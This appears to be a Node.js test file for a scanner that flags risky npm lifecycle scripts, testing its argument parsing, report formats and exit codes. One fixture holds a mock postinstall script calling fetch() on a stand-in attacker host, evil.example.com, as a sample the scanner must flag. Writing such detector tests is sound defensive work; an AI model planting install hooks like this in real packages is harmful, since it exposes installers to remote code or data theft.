#!/usr/bin/env node
'use strict'

// Tests for analyze-lifecycle-scripts.js.

const { test } = require('node:test')
const assert = require('node:assert/strict')
const {
  parseCliArgs,
  formatReport,
  main,
  setImpls,
  resetImpls,
} = require('./analyze-lifecycle-scripts.js')

function makeMockFetch(manifest) {
  return async () => manifest
}

test('parseCliArgs extracts package, fail, format and silent flags', () => {
  const args = parseCliArgs([
    '--pkg=lodash@4.17.21',
    '--fail',
    '--format=json',
    '--silent',
  ])
  assert.equal(args.pkgArg, 'lodash@4.17.21')
  assert.equal(args.isFail, true)
  assert.equal(args.format, 'json')
  assert.equal(args.isSilent, true)
})

test('parseCliArgs defaults to table format', () => {
  const args = parseCliArgs(['--pkg=lodash@4.17.21'])
  assert.equal(args.format, 'table')
  assert.equal(args.isFail, false)
  assert.equal(args.isSilent, false)
})

test('parseCliArgs throws on invalid format', () => {
  assert.throws(
    () => parseCliArgs(['--pkg=lodash@4.17.21', '--format=xml']),
    /Invalid format/,
  )
})

test('formatReport returns JSON with summary', () => {
  const results = [
    {
      package: 'pkg@1.0.0',
      scripts: {},
      findings: [],
      hasLifecycleScripts: false,
      riskLevel: 'none',
    },
  ]
  const output = formatReport(results, 'json')
  const parsed = JSON.parse(output)
  assert.equal(parsed.summary.totalPackages, 1)
  assert.equal(parsed.results[0].riskLevel, 'none')
})

test('formatReport returns markdown', () => {
  const results = [
    {
      package: 'pkg@1.0.0',
      scripts: { install: 'node-gyp rebuild' },
      findings: [
        {
          package: 'pkg@1.0.0',
          script: 'install',
          level: 'medium',
          pattern: 'native-build',
          message: 'compiles a native addon',
        },
      ],
      hasLifecycleScripts: true,
      riskLevel: 'medium',
    },
  ]
  const output = formatReport(results, 'markdown')
  assert.ok(output.includes('# Lifecycle script analysis report'))
  assert.ok(output.includes('MEDIUM'))
})

test('main exits 0 for safe package', async () => {
  const exitCodes = []
  setImpls({
    fetchRegistryJson: makeMockFetch({ scripts: { test: 'node test.js' } }),
    exit: (code) => exitCodes.push(code),
  })

  try {
    await main(['--pkg=safe@1.0.0', '--silent'])
    assert.deepEqual(exitCodes, [0])
  } finally {
    resetImpls()
  }
})

test('main exits 1 with --fail on high-risk package', async () => {
  const exitCodes = []
  setImpls({
    fetchRegistryJson: makeMockFetch({
      scripts: { postinstall: "fetch('https://evil.example.com')" },
    }),
    exit: (code) => exitCodes.push(code),
  })

  try {
    await main(['--pkg=evil@1.0.0', '--fail', '--silent'])
    assert.deepEqual(exitCodes, [1])
  } finally {
    resetImpls()
  }
})

test('main exits 1 when package argument is missing', async () => {
  const exitCodes = []
  setImpls({
    exit: (code) => exitCodes.push(code),
  })

  try {
    await main([])
    assert.deepEqual(exitCodes, [1])
  } finally {
    resetImpls()
  }
})

test('main exits 1 when version is missing', async () => {
  const exitCodes = []
  setImpls({
    exit: (code) => exitCodes.push(code),
  })

  try {
    await main(['--pkg=lodash'])
    assert.deepEqual(exitCodes, [1])
  } finally {
    resetImpls()
  }
})

test('main exits 1 when registry fetch fails', async () => {
  const exitCodes = []
  setImpls({
    fetchRegistryJson: async () => {
      throw new Error('network error')
    },
    exit: (code) => exitCodes.push(code),
  })

  try {
    await main(['--pkg=lodash@4.17.21', '--silent'])
    assert.deepEqual(exitCodes, [1])
  } finally {
    resetImpls()
  }
})
